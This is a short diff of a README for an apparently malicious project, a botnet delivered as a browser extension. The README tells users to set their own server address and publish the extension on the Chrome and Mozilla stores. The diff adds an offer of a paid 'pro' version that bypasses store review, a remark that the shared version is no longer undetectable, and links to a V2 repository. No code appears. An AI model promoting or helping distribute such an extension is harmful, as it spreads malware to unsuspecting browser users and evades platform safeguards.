@@ -38,9 +38,8 @@ change http://1127.0.0.1     to your web server
 4) publish your extension one chrome web store or adon mozilla
 
 waring !!!!!!!
-# Version pro 
-
-https://github.com/hakanonymos/botnet-browser-chrome-firefox-V2
+# Version pro to bypass mozilla firefox or chrome web store
+# Contact me because this version was shared by many people and it is not fud
 
 ##################################################
 
@@ -55,6 +54,10 @@ Instagram : https://www.instagram.com/hakanonymos
 # demo video Youtub (update video )
 
 https://www.youtube.com/watch?v=ljZsw3bRxPY&t=1s
+
+# New version beautiful design
+
+https://github.com/hakanonymos/botnet-browser-chrome-firefox-V2
 
   
 
